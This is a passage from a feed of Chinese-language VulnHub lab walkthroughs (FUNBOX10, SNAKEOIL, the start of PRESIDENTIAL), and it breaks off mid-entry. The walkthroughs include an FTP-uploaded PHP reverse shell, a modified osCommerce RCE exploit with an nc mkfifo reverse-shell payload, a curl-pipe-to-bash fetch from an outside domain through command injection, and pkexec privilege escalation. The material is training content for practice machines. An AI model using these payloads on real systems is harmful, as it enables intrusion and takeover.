width=\"450\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 21,22,80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAyLw==\">http://192.168.31.102/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-566.png\" width=\"650\" alt=\"Image\">\n<p><code>dirsearch -u http://192.168.31.6</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-567.png\" width=\"440\" alt=\"Image\">\n<p>只看到了一个目录，是 files 文件夹，直接访问此链接: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNi9maWxlcy8=\">http://192.168.31.6/files/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-568.png\" width=\"330\" alt=\"Image\">\n<p>查看此文件指向地址的详细内容:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNi9maWxlcy9DQUxMLmh0bWw=\">http://192.168.31.6/files/CALL.html</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-569.png\" width=\"300\" alt=\"Image\">\n<p>审查源代码，查看更多的关键信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-571.png\" width=\"520\" alt=\"Image\">\n<p>网站信息收集之后没有什么关键的信息</p>\n<h3 id=\"ftp-匿名下载上传\"><a class=\"markdownIt-Anchor\" href=\"#ftp-匿名下载上传\">#</a> FTP 匿名下载上传</h3>\n<p>对 ftp 做检查，检测 ftp 服务上是否存在弱口令，是否能搜集到关键信息</p>\n<p>ftp 192.168.31.6<br>\nget CALL.html</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-572.png\" width=\"420\" alt=\"Image\">\n<p>将 CALL.html 文件下载之后查阅，发现和 web 服务是同样的代码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-573.png\" width=\"420\" alt=\"Image\">\n<p>可以控制 ftp 服务向靶机发送 payload，判断是否能上传到网站<br>\n <code>cp /usr/share/webshells/php/php-reverse-shell.php .</code></p>\n<p>修改监听 ip 地址和端口号为攻击机<br>\n <code>cat shell.php | head -n 55 | tail -n 10</code></p>\n<p>连接 ftp，put shell.php 上传文件，打开网址发现 exp 上传成功</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-574.png\" width=\"370\" alt=\"Image\">\n<p>点击运行即可成功收到会话，也可以上传一句话木马，使用蚁剑连接</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-575.png\" width=\"420\" alt=\"Image\">\n<h3 id=\"md5-解密\"><a class=\"markdownIt-Anchor\" href=\"#md5-解密\">#</a> MD5 解密</h3>\n<p>查看目录下 important.txt 文件，发现根目录有可执行脚本，运行一下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-577.png\" width=\"320\" alt=\"Image\">\n<p>解密这个 md5，得到 onion。猜测这是 ssh 的登录密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-578.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"sudopython3提权\"><a class=\"markdownIt-Anchor\" href=\"#sudopython3提权\">#</a> sudo (python3) 提权</h3>\n<p>su shrek 依靠 onion 密码登陆 ssh 成功<br>\n这里使用 python 进行提权，得到 root 身份运行的 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-579.png\" width=\"520\" alt=\"Image\">\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/122%20FUNBOX10/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/122%20FUNBOX10/",
            "title": "VULNHUB 22 FUNBOX10",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZnVuYm94LXVuZGVyLWNvbnN0cnVjdGlvbiw3MTUv\">https://www.vulnhub.com/entry/funbox-under-construction,715/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3RpbWVzbGVlcC9hcnRpY2xlL2RldGFpbHMvMTI0MDA1NDM0\">https://blog.csdn.net/timesleep/article/details/124005434</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 FUNBOX10：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-503.png\" width=\"540\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.133</p>\n<p>2）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p- 192.168.31.133</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-504.png\" width=\"420\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22,25,80,110,133</p>\n<p>SMTP（简单邮件传输协议）是用于发送和接收电子邮件的 TCP/IP 协议。但是，由于它在接收端对消息进行排队的能力有限，因此它通常与其他两种协议（POP3 或 IMAP）中的一种一起使用，让用户将消息保存在服务器邮箱中并定期从服务器下载它们。</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTMz\">http://192.168.31.133</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-505.png\" width=\"620\" alt=\"Image\">\n<p><code>dirsearch -u http://192.168.31.133</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-506.png\" width=\"520\" alt=\"Image\">\n<p>对扫描的网址进行挨个测试，发现到一个敏感网址:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2c=\">http://192.168.31.133/catalog</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-507.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"oscommerce-漏洞寻找\"><a class=\"markdownIt-Anchor\" href=\"#oscommerce-漏洞寻找\">#</a> oscommerce 漏洞寻找</h3>\n<p>靶机上存在 oscommerce，直接搜索是否存在相应的 exp</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-508.png\" width=\"520\" alt=\"Image\">\n<p>默认进入的漏洞利用并不能直接权限提升，用更精确的搜寻来寻找在 exploit-db 上搜查 osCommerce 2.3.4 存在的漏洞</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-509.png\" width=\"620\" alt=\"Image\">\n<p>-&gt; 搜索到了一个 RCE 漏洞，此影响较大，可直接拿到 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-510.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"exploit-db-使用\"><a class=\"markdownIt-Anchor\" href=\"#exploit-db-使用\">#</a> exploit-db 使用</h3>\n<p>获取漏洞利用代码 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDQzNzQ=\">https://www.exploit-db.com/exploits/44374</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-511.png\" width=\"620\" alt=\"Image\">\n<p>查看该漏洞是如何利用的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-512.png\" width=\"620\" alt=\"Image\">\n<p>需要两个地址，一个是基础的路径，一个是目标路径<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbmRleC5waHA=\"> http://192.168.31.133/catalog/install/index.php</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbnN0YWxsLnBocD9zdGVwPTQ=\">http://192.168.31.133/catalog/install/install.php?step=4</span></p>\n<p>同时也可以从 searchsploit 获取到漏洞利用的代码<br>\n searchsploit osCommerce 2.3.4.1<br>\nsearchsploit -x php/webapps/44374.py</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-513.png\" width=\"700\" alt=\"Image\">\n<p>查看 exp 利用方式的两个 url 地址是否能正常访问<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbmRleC5waHA=\"> http://192.168.31.133/catalog/install/index.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-514.png\" width=\"520\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbnN0YWxsLnBocD9zdGVwPTQ=\">http://192.168.31.133/catalog/install/install.php?step=4</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-515.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"oscommerce-漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#oscommerce-漏洞利用\">#</a> oscommerce 漏洞利用</h3>\n<p>从 searchsploit 中获取到的 exp 复制出来，进行修正</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-516.png\" width=\"420\" alt=\"Image\">\n<p>需要修改的有三个地方，两个 url 地址，以及要执行的命令<br>\n base_url=“<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbmRleC5waHAlRTIlODAlOUQ=\">http://192.168.31.133/catalog/install/index.php”</span><br>\ntarget_url=“<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbnN0YWxsLnBocD9zdGVwPTQlRTIlODAlOUQ=\">http://192.168.31.133/catalog/install/install.php?step=4”</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-517.png\" width=\"580\" alt=\"Image\">\n<p>执行反弹 shell 的命令，调用系统去在 /tmp 里边写一个文件，用来反弹<br>\n payload += ‘system (“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.31.135 4444 &gt;/tmp/f”);’</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-518.png\" width=\"580\" alt=\"Image\">\n<p>运行此 exp，得到一个 url 地址，是用来触发命令的链接</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-519.png\" width=\"560\" alt=\"Image\">\n<p>监听 kali 机器上的 4444 端口，同时访问该 url 地址使得命令被执行，得到反弹的 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-520.png\" width=\"520\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">紧接着用python3 拿到一个标准的终端</span></span><br><span class=\"line\">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class=\"line\">stty raw -echo;fg</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-521.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"pspy64-监控\"><a class=\"markdownIt-Anchor\" href=\"#pspy64-监控\">#</a> pspy64 监控</h3>\n<p>翻阅目录时并没有找到敏感文件，直接上传一个 pspy<br>\n 监控靶机上有没有定期执行一些需要高权限才能执行的命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget 192.168.31.135/pspy64s</span><br><span class=\"line\">chmod +x pspy64s</span><br><span class=\"line\">./pspy64s</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-522.png\" width=\"520\" alt=\"Image\">\n<p>看到有个计划任务被执行，查看后发现其中有一串 base64 加密数据，</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-523.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 解密后发现是 root 的密码，su root 提权成功</p>\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/125%20SNAKEOIL/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/125%20SNAKEOIL/",
            "title": "VULNHUB 25 SNAKEOIL",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZGlnaXRhbHdvcmxkbG9jYWwtc25ha2VvaWwsNzM4Lw==\">https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU2ODg5NjQuaHRtbA==\">https://www.cnblogs.com/sainet/p/15688964.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 SNAKEOIL：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-580.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.143</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p- 192.168.31.143</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-581.png\" width=\"420\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22,80,8080</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAy\">http://192.168.31.102</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-582.png\" width=\"540\" alt=\"Image\">\n<p><code>dirsearch -u http://192.168.31.143</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-583.png\" width=\"250\" alt=\"Image\">\n<p>-&gt; 80 端口没有任何发现</p>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAv\">http://192.168.31.143:8080/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-584.png\" width=\"620\" alt=\"Image\">\n<p><code>dirsearch -u http://192.168.31.143:8080/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-585.png\" width=\"320\" alt=\"Image\">\n<p>-&gt; 8080 端口存在以下目录</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvbG9naW4=\">http://192.168.31.143:8080/login</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u\">http://192.168.31.143:8080/registration</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvc2VjcmV0\">http://192.168.31.143:8080/secret</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdGVzdA==\">http://192.168.31.143:8080/test</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdXNlcnM=\">http://192.168.31.143:8080/users</span></p>\n<h3 id=\"burp-篡改数据包\"><a class=\"markdownIt-Anchor\" href=\"#burp-篡改数据包\">#</a> BURP 篡改数据包</h3>\n<p>查看目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvbG9naW4=\">http://192.168.31.143:8080/login</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-586.png\" width=\"520\" alt=\"Image\">\n<p>提示请求方法错了，抓包看下数据包：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-587.png\" width=\"650\" alt=\"Image\">\n<p>提示提交方法有问题，换其他的提交方法</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-588.png\" width=\"650\" alt=\"Image\">\n<p>提示 username 字段不能为空，那就加上 username 字段</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-589.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; 提示内容不理解，换其他目录查看</p>\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u\">http://192.168.31.143:8080/registration</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-590.png\" width=\"520\" alt=\"Image\">\n<p>提示请求方法错了，抓包看下数据包：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-591.png\" width=\"650\" alt=\"Image\">\n<p>提示提交方法有问题，换其他的提交方法</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-592.png\" width=\"650\" alt=\"Image\">\n<p>提示 username 字段不能为空，那就加上 username 字段</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-593.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; 没啥效果，去访问其他页面看看 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdXNlcnM=\">http://192.168.31.143:8080/users</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-594.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; 猜测确实需要 username 和 password 两个字段</p>\n<h3 id=\"content-type-字段利用\"><a class=\"markdownIt-Anchor\" href=\"#content-type-字段利用\">#</a> Content-Type 字段利用</h3>\n<p>仔细观察数据包，发现缺少 Content-type 字段：<br>\napplication/x-www-form-urlencoded： 窗体数据被编码为名称 / 值对。这是标准的编码格式。<br>\nmultipart/form-data： 窗体数据被编码为一条消息，页上的每个控件对应消息中的一个部分。<br>\ntext/plain： 窗体数据以纯文本形式进行编码，其中不含任何控件或格式字符。</p>\n<p>访问目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u\">http://192.168.31.143:8080/registration</span><br>\n 添加字段：Content-Type:application/x-www-form-urlencoded</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-595.png\" width=\"650\" alt=\"Image\">\n<p>提示变了，password 字段不能为空，再加上 password 字段：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-596.png\" width=\"650\" alt=\"Image\">\n<p>注册成功，那就在 /login 页面登陆一下，要加上用户名和密码：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-597.png\" width=\"650\" alt=\"Image\">\n<p>再访问一些别的页面（现在是在登陆状态中）：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-598.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 没啥新发现</p>\n<h3 id=\"扩大信息面\"><a class=\"markdownIt-Anchor\" href=\"#扩大信息面\">#</a> 扩大信息面</h3>\n<p>用更大的字典又扫了一遍目录，发现两个新目录</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvY3JlYXRl\">http://192.168.31.143:8080/create</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcnVu\">http://192.168.31.143:8080/run</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-599.png\" width=\"380\" alt=\"Image\">\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcnVu\">http://192.168.31.143:8080/run</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-600.png\" width=\"420\" alt=\"Image\">\n<p>提示需要修改请求方法，抓取数据包</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-601.png\" width=\"650\" alt=\"Image\">\n<p>修改提交方法为 POST</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-602.png\" width=\"650\" alt=\"Image\">\n<p>提示要以 url:port 形式提供要请求的 URL：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-603.png\" width=\"650\" alt=\"Image\">\n<p>格式换成 Content-Type: application/json， 在 ajax 中，如果没加 contentType:“application/json”，那么 data 就对应的是 json 对象；反之，如果加了 contentType:“application/json”，那么 ajax 发送的就是字符串。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-604.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; 现在又提示需要 secret key ，</p>\n<h3 id=\"伪造-access_token\"><a class=\"markdownIt-Anchor\" href=\"#伪造-access_token\">#</a> 伪造 access_token</h3>\n<p>访问一下 /secret 页面：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-605.png\" width=\"650\" alt=\"Image\">\n<p>登录是失败的，应该是缺少 cookie 的，之前注册成功后，登陆时返回一个 token 值：<br>\n <code>“access_token”:“ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY1MjY4NTY1MCwianRpIjoiODhkNDllNzktNjRlNC00ZWZlLWIyZTItODhlOWJhN2NmNWQ2IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QiLCJuYmYiOjE2NTI2ODU2NTAsImV4cCI6MTY1MjY4NjU1MH0.kwHX8k6JDWCCjoAHtReOPOe3H7CSshM5oXZYl2XpSDo”</code></p>\n<p>但是填写 cookie 时是需要一个 key 值的，这个 key 值在尝试 access_token 时是不对的<br>\n翻阅网站，找到以下地址中网站中有个链接</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-606.png\" width=\"650\" alt=\"Image\">\n<p>点进去看看，有一些配置信息链接，从中找到了 cookie 的名称</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-607.png\" width=\"650\" alt=\"Image\">\n<p>再次提交 cookie，字段名字为 access_token_cookie：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-608.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; 得到 “secret_key”: “commandexecutionissecret”</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">重新梳理一下思路：</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">1 .访问registration,login页面，因为Get方式报错，所以改为了Post方式提示<span class=\"built_in\">uname</span>字段缺失，因此增加了该字段，但是无效果</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">2 .访问<span class=\"built_in\">users</span>页面，发现确实需要<span class=\"built_in\">uname</span>和password两个字段</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">3 .重新审查registration数据包，发现缺少Content-Type字段</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">4 .在registration添加字段：Content-Type:application/x-www-form-urlencoded 后成功提交了<span class=\"built_in\">uname</span>数据提示缺少password字段，添加后返回注册成功的消息</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">5 .在login中添加Content-Type与<span class=\"built_in\">uname</span>和password后登陆成功，返回了access_token</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">6 .访问run页面，发现需要提交url：port数据，修改Content-Type为json数据后，把url和port提交，提示需要secret_key</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">7.访问secret页面，发现返回错误，推测与login登陆后返回的token有关，但cookies的字段名是不知道的</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">8 .点击网站，搜寻到cookies的字段名为access_token_cookie，将cookies的字段名修改后重新提交到secret页面，返回了secret_key</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">9 .接下来需要访问run界面，并且把上述得到的secret_key加上</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"curl-rce-命令执行\"><a class=\"markdownIt-Anchor\" href=\"#curl-rce-命令执行\">#</a> CURL RCE 命令执行</h3>\n<p>访问 run 界面，加上 secret_key 字段</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-609.png\" width=\"650\" alt=\"Image\">\n<p>返回了比较奇怪的字符串，直接搜索，发现这是 curl 命令执行后的回显</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-610.png\" width=\"650\" alt=\"Image\">\n<p>相当于在 curl 后拼接命令，但是管道符号不起作用</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-611.png\" width=\"650\" alt=\"Image\">\n<p>后面在加一个分号时成功得到了 whoami 信息，是 RCE 漏洞</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-612.png\" width=\"650\" alt=\"Image\">\n<p>尝试往其中写入 shell: <code>curl http://www.chentuo.asia/shell.sh | bash;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-613.png\" width=\"650\" alt=\"Image\">\n<p>尝试:`curl <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jaGVudHVvLmFzaWEvc2hlbGwuc2g=\">http://www.chentuo.asia/shell.sh</span> | sh;``</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-614.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; 登陆成功，拿到了 patrick 的权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-615.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"pkexec-提权\"><a class=\"markdownIt-Anchor\" href=\"#pkexec-提权\">#</a> pkexec 提权</h3>\n<p>服务器存在 s 权限的 pkexec，并且有 gcc 编译器</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-616.png\" width=\"560\" alt=\"Image\">\n<p>-&gt; 通过 pkexec 进行提权，成功拿到了 root 权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-617.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"配置文件泄露\"><a class=\"markdownIt-Anchor\" href=\"#配置文件泄露\">#</a> 配置文件泄露</h3>\n<p>看看有没有其他的提权方式，shutdown 可以无密码使用但没法提权<br>\n调用 root 权限的时候是需要 patrick 的密码的，但是我们没密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-618.png\" width=\"520\" alt=\"Image\">\n<p>找找系统中的文件，看有没有线索，最后在～/flask_blog/app.py 文件中找到一个密码：NOreasonableDOUBTthisPASSWORDisGOOD<br>\nsudo su 使用此密码通过 patrick 来提到 root</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-619.png\" width=\"460\" alt=\"Image\">\n<p>-&gt; 提权成功，拿到了 root 权限</p>\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/129%20PRESIDENTIAL/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/129%20PRESIDENTIAL/",
            "title": "VULNHUB 29 PRESIDENTIAL",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcHJlc2lkZW50aWFsLTEsNTAwLw==\">https://www.vulnhub.com/entry/presidential-1,500/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 PRESIDENTIAL：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n <code>sudo arp-sacn -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-723.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.0.153</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p 192.168.0.153</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-724.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 21,2082</p>\n<p>发现了一个比较奇怪的端口，用 nmap 扫描其详细信息，发现是 ssh 服务</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-725.png\" width=\"440\" alt=\"Image\">\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNTM=\">http://192.168.0.153</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-726.png\" width=\"520\" alt=\"Image\">\n<p>没有明显发现，对其目录结构进行扫描</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-727.png\" width=\"440\" alt=\"Image\">\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNTMvY29uZmlnLnBocA==\">http://192.168.0.153/config.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-728.png\" width=\"320\" alt=\"Image\">\n<p>查看目录:<span class=\"exturl\" 